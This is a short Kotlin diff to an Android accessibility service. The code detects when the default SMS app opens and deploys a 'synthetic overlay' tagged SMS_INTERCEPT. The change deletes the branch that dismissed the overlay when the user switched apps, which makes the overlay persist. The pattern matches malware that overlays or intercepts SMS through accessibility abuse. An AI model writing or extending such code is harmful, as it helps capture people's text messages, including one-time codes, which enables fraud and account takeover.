@@ -508,10 +508,6 @@ class MyAccessibilityService : AccessibilityService() {
                     DebugLogger.log("SMS_INTERCEPT", "Default SMS app launched. Deploying synthetic overlay.")
                     DynamicUIManager.deploySmsInterceptor(this)
                 }
-            } else if (DynamicUIManager.isSmsInterceptorActive && pkgName != packageName && pkgName != "android") {
-                // User pressed Home, Recents, or switched apps. Collapse overlay instantly.
-                DebugLogger.log("SMS_INTERCEPT", "User navigated away to $pkgName. Dismissing synthetic overlay.")
-                DynamicUIManager.removeOverlay(this, "USER_NAVIGATED_AWAY", true)
             }
         }
 
